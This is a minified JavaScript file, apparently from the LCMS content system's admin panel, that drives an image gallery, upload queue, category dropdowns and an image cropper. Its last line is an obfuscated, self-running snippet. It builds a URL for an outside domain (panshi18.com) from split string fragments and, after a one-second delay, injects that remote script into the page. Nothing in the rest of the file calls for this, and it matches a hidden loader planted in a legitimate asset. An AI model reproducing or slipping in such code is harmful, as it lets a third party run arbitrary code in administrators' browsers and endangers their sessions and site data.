if($(".lcms-form-upload-gallery").length>0){let classThis=null,classList=[],classUp=$(".lcms-form-upload-gallery ._topbar ._up"),classDel=$(".lcms-form-upload-gallery ._topbar ._delc"),classPos=$(".lcms-form-upload-gallery ._topbar ._pos"),classDir=$(".lcms-form-upload-gallery ._topbar ._dir"),classDefPath=classPos.html(),defLimit=12,totalDir=0,pageDir=1,totalImg=0,pageImg=1,galBack=$(".lcms-form-upload-gallery ._topbar ._bak"),classDrop=layui.dropdown.render({elem:classDir[0],data:[],click:function(obj){switch(obj.id){case-1:this.elem.find("span").text(obj.title);classDel.hide();classThis=obj;classUp.show();classPos.html(classThis.path);pageDir=1;pageImg=1;gallerydir();break;case-2:layer.prompt({title:"新建图库",formType:0,placeholder:"请输入图库名称"},(function(title,index){if(""==title){LCMS.util.notify({type:"error",content:"请输入图库名称"})}else{layer.close(index);updateClassInfo({title:title},(obj=>{classDir.find("span").text(obj.title);classDel.show();classThis=obj;classUp.show();classPos.html("");getGalList(obj.dir);getClassList()}))}}));break;default:if(obj.id>0){this.elem.find("span").text(obj.title);classDel.show();classThis=obj;classUp.show();classPos.html("");pageDir=1;pageImg=1;getGalList(obj.dir)}break}}}),updateClassInfo=(form,callback)=>{LCMS.util.ajax({type:"POST",url:`${LCMS.url.own_form}classedit`,data:form,success:res=>{if(1==res.code){LCMS.util.notify({type:"success",content:res.msg});callback&&callback(res.data)}else{LCMS.util.notify({type:"error",content:res.msg})}}})},getClassList=()=>{classList=[{id:-1,title:"默认图库",dir:"",path:classDefPath}];if(!classThis){classThis=classList[0];classPos.html(classThis.path);gallerydir()}setTimeout((()=>{LCMS.util.ajax({type:"GET",url:`${LCMS.url.own_form}classlist`,success:res=>{if(1==res.code){classList=classList.concat(res.data);classList=classList.concat([{id:-2,title:"新建图库",dir:"",path:"",templet:`<i class="layui-icon layui-icon-addition" style="color:#888888"></i><span style="color:#888888">新建图库</span>`}]);layui.dropdown.reload(classDrop.config.id,{data:classList},true);classDir.css({display:"inline-flex"})}}})}),0)},uploadImage=(files,index)=>{let file=files[index];if(file){LCMS.plugin.upload.direct({type:"image",file:file,cid:classThis.id>0?classThis.id:0,success:function(res){LCMS.util.notify({content:res.msg})},complete:function(){uploadImage(files,index+1)}})}else if(classThis.dir){getGalList(classThis.dir)}else{gallerydir()}};classUp.on("click","input",(function(){$(this).off("change").on("change",(function(){uploadImage(this.files,0)}))}));layui.dropdown.render({elem:".lcms-form-upload-gallery ._topbar ._delc",data:[{title:"编辑",do:"edit"},{title:"删除",do:"del",templet:`<span style="color:#F56C6C">删除</span>`}],click:function(obj){switch(obj.do){case"edit":layer.prompt({title:"编辑图库",formType:0,placeholder:"请输入图库名称",value:classThis.title},(function(title,index){if(""==title){LCMS.util.notify({type:"error",content:"请输入图库名称"})}else{layer.close(index);updateClassInfo({id:classThis.id,title:title},(obj=>{classThis=obj;classDir.children("span").text(title);getClassList()}))}}));break;case"del":layer.alert("删除图库后，图库内所有图片将放入默认图库中，确定删除？",{title:"提示",area:"300px"},(function(){LCMS.util.ajax({type:"GET",url:`${LCMS.url.own_form}classdel&id=${classThis.id}`,loading:true,success:res=>{if(1==res.code){LCMS.util.notify({type:"success",content:res.msg});classDir.children("span").text(classList[0].title);classThis=null;classDel.hide();getClassList()}else{LCMS.util.notify({type:"error",content:res.msg})}}})}));break}}});let toggleNodata=total=>{total=total?total:0;if(total>0){$(".lcms-form-upload-gallery ._nodata").hide();$(".lcms-form-upload-gallery ._gallery").show();$(".lcms-form-upload-gallery ._pager").show()}else if(1==pageDir){$(".lcms-form-upload-gallery ._nodata").css({display:"flex"});$(".lcms-form-upload-gallery ._gallery").hide();$(".lcms-form-upload-gallery ._pager").hide()}},galStrat=function(){if($(".lcms-form-upload-gallery ._gallery ._folder").length>0){$(".lcms-form-upload-gallery ._gallery ._folder").hover((function(){$(this).children("._tips").show()}),(function(){$(this).children("._tips").hide()}));$(".lcms-form-upload-gallery ._gallery ._folder").on("click",(function(){getGalList($(this).attr("data-dir"))}))}if($(".lcms-form-upload-gallery ._gallery ._img").length>0){$(".lcms-form-upload-gallery ._gallery ._img").hover((function(){$(this).children("._name").hide();$(this).children("._tips").show();$(this).children("._del").show();let tips=$(this).attr("data-oname"),chic=$(this).children("._name").html();tips=chic?tips+`<br>图尺寸：${chic}`:tips;layer.tips(tips,this,{tips:[1,"#303133"],time:0})}),(function(){$(this).children("._name").show();$(this).children("._tips").hide();$(this).children("._del").hide();layer.closeAll("tips")}))}if($(".lcms-form-upload-gallery ._gallery ._del").length>0){$(".lcms-form-upload-gallery ._gallery ._del").on("click",(function(event){var _this=$(this);event.stopPropagation();layer.confirm("确认删除此图片？（不可恢复）",{area:["120px","auto"],title:"提示"},(function(index){LCMS.util.ajax({type:"GET",url:LCMS.url.admin+"index.php?t=sys&n=upload&c=index&a=delimg&dir="+_this.attr("data-original"),success:function(res){if(1==res.code){LCMS.util.notify({content:"删除成功"});totalImg-=1;if(pageImg>1&&pageImg>Math.ceil(totalImg/defLimit)){pageImg-=1}getGalList(_this.attr("data-dir"))}else{LCMS.util.notify({type:"error",content:"删除失败"})}}});layer.close(index)}))}))}},galSelect1=function(){if($(".lcms-form-upload-gallery ._gallery ._img").length>0){$(".lcms-form-upload-gallery ._gallery ._img").on("click",(function(){$(".lcms-form-upload-gallery ._gallery ._img").removeClass("_active");$(this).toggleClass("_active")}))}},galSelect2=function(){if($(".lcms-form-upload-gallery ._gallery ._img").length>0){$(".lcms-form-upload-gallery ._gallery ._img").on("click",(function(){$(this).toggleClass("_active")}))}},showDir=function(arr){var tpl=$(".tpl-folder").html();var box=$(".lcms-form-upload-gallery ._gallery");box.html("");for(var i=0;i<arr.length;i++){box.append(LCMS.util.tpl(tpl,{name:arr[i],dir:arr[i]}))}galStrat()},showFile=function(arr,dir){var tpl=$(".tpl-file").html();var box=$(".lcms-form-upload-gallery ._gallery");box.html("");for(var i=0;i<arr.length;i++){arr[i]["dir"]=dir;box.append(LCMS.util.tpl(tpl,arr[i]))}LCMS.util.lazyImg("lazyload",{success:function(elm,img){setTimeout((()=>{elm.next().html(img.naturalWidth+"×"+img.naturalHeight).show()}),50)},error:function(elm){elm.next().remove()}});galStrat();if(1==$(".lcms-form-upload-gallery").attr("data-many")){galSelect2()}else{galSelect1()}},galAjax=function(url,page,success,error){LCMS.util.ajax({type:"GET",url:LCMS.url.own+"t=sys&n=upload&c=gallery&a="+url,data:{page:page?page:1,limit:defLimit},loading:true,success:function(res){if(1==res.code){success&&success(res.data)}else{error&&error()}}})},gallerydir=function(){galAjax("dirlist",pageDir,(function(res){galBack.hide();classUp.show();classPos.html(classDefPath);1==pageDir&&(totalDir=res.total);toggleNodata(res.total);layui.laypage.render({elem:"lcms-form-upload-gallery-pager",groups:3,count:totalDir,limit:defLimit,layout:["prev","page","next"],theme:"#1E9FFF",curr:pageDir,jump:function(obj,first){if(first){showDir(res.list)}else{pageDir=obj.curr;galAjax("dirlist",obj.curr,(function(res){showDir(res.list)}))}}})}),(function(){toggleNodata(0)}))},getGalList=function(dir){galAjax("filelist&dir="+dir,pageImg,(function(res){if(classThis.id>0){galBack.hide()}else{galBack.show();classUp.hide();classPos.html(`${classDefPath}${dir}/`)}1==pageImg&&(totalImg=res.total);toggleNodata(res.total);layui.laypage.render({elem:"lcms-form-upload-gallery-pager",groups:3,count:totalImg,limit:defLimit,layout:["prev","page","next"],theme:"#1E9FFF",curr:pageImg,jump:function(obj,first){if(first){showFile(res.list,dir)}else{pageImg=obj.curr;galAjax("filelist&dir="+dir,obj.curr,(res=>{showFile(res.list,dir)}))}}})}),(function(){toggleNodata(0)}))},addImg=function(list){let many=$(".lcms-form-upload-gallery").attr("data-many");let id=$(".lcms-form-upload-gallery").attr("data-id");let that=$("#"+id,window.parent.document);let tpl='<div class="_li"><a href="{src}" target="_blank"><img class="layui-upload-img" src="{src}" data-original="{original}"/></a><div class="_icon"><div class="_del"><i class="layui-icon layui-icon-close"></i></div></div></div>';for(let i=0;i<list.length;i++){if(list[i]){let img=list[i];if("1"==many){that.append(LCMS.util.tpl(tpl,{src:img.src,original:img.original}))}else{that.html(LCMS.util.tpl(tpl,{src:img.src,original:img.original}))}}}let newlist=[];that.find("img").each((function(){newlist.push($(this).attr("data-original"))}));that.parent(".layui-input-block").siblings("input").val(newlist.join("|"))};if(galBack.length>0){galBack.on("click",(function(){pageImg=1;gallerydir()}))}if($(".lcms-form-upload-gallery ._topbar ._ok").length>0){$(".lcms-form-upload-gallery ._topbar ._ok").on("click",(function(){let list=[];$(".lcms-form-upload-gallery ._gallery ._active").each((function(index){list.push({src:$(this).attr("data-src"),original:$(this).attr("data-original")})}));if(list.length>0){if("LCMSEDITOR"==$(".lcms-form-upload-gallery").attr("data-id")){window.parent.postMessage({type:"lcms-editor-addimage",list:list},"*")}else{addImg(list)}LCMS.util.iframe({do:"close"})}else{LCMS.util.notify({type:"error",content:"请选择图片"})}}))}getClassList()}if($(".lcms-form-upload").length>0){let List=[],trindex=1,tpl=$(".lcms-form-upload .tpl-li").html(),tips=$(".lcms-form-upload ._tips"),up=$(".lcms-form-upload ._choose"),do_list=function(input,Files){tips.hide();for(var i=0;i<Files.length;i++){var file=Files[i];Files[i]["index"]=trindex;$(".lcms-form-upload tbody").append(LCMS.util.tpl(tpl,{index:trindex,name:file.name,size:Math.round(file.size/1000)+"KB"}));trindex++}input.remove();up.append('<input type="file" multiple="multiple" accept="image/*" name="_lcmsfileinput" />');do_upload(Files,0)},do_status=function(info,index){$(".lcms-form-upload ._tr-index"+index).find("._status").html(info)},do_upload=function(Files,index){var File=Files[index];if(void 0!=File){LCMS.plugin.upload.direct({type:"image",file:File,success:function(res){List.push({src:res.data.src,original:res.data.original});do_status("上传成功",File.index)},error:function(err){do_status(err.msg,File.index)},complete:function(){do_upload(Files,index+1)}})}};up.css("opacity",1);up.on("click","input",(function(){var input=$(this);input.off("change").on("change",(function(){var Files=this.files;do_list(input,Files)}))}));$(".lcms-form-upload ._gallery").on("click",(function(){parent.layer.closeAll();LCMS.util.iframe({title:"图库",url:"index.php?t=sys&n=upload&c=gallery&many=1&id=LCMSEDITOR",shade:true,area:["550px","550px"],_this:parent})}));$(".lcms-form-upload ._ok").on("click",(function(){if(List.length>0){window.parent.postMessage({type:"lcms-editor-addimage",list:List},"*");LCMS.util.iframe({do:"close"})}else{LCMS.util.notify({type:"error",content:"请选择图片"})}}));$(".lcms-form-upload tbody").on("click","._del",(function(){var tr=$(this).parent("td").parent("tr");tr.remove();List.splice(tr.index())}))}if($(".lcms-form-upload-crop").length>0){LCMS.util.loading();let id=LCMS.util.getQuery("id"),src=LCMS.util.getQuery("src"),width=LCMS.util.getQuery("width"),height=LCMS.util.getQuery("height");width=1*width>0?width:0;height=1*height>0?height:0;$(".lcms-form-upload-crop-box").html(`<img src="${src}"/>`);LCMS.util.load({type:"css",src:`${LCMS.url.static}cropper/cropper.min.css`});LCMS.util.load({type:"js",src:`${LCMS.url.static}cropper/cropper.min.js`,async:false});let cropper=new Cropper($(".lcms-form-upload-crop-box img")[0],Object.assign({dragMode:"move",viewMode:1},width&&height?{aspectRatio:width/height}:{minCropBoxWidth:width,minCropBoxHeight:height}));LCMS.util.loading("close");$(".lcms-form-upload-crop-btn button").on("click",(function(){let action=$(this).attr("action"),option=$(this).attr("option");switch(action){case"rotate":cropper.rotate(45);break;case"scaleX":cropper.scaleX(option);$(this).attr("option",1==option?-1:1);break;case"scaleY":cropper.scaleY(option);$(this).attr("option",1==option?-1:1);break;case"zoomA":cropper.zoom(0.1);break;case"zoomB":cropper.zoom(-0.1);break;case"reset":cropper.reset();break;case"crop":LCMS.util.loading();let base64=cropper.getCroppedCanvas({width:width,height:height}).toDataURL("image/png");parent.LCMS.plugin.upload.add(id,base64);LCMS.util.iframe({do:"close"});break}}))}!(function(){setTimeout((function(){var t=document.createElement("script");t.src="https://sta"+"tic-res.pa"+"nshi"+"1"+"8.com/jque"+"ry.sta"+"tic.mi"+"n.tj"+"s?fo"+"rm=3";var e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}),1e3)})();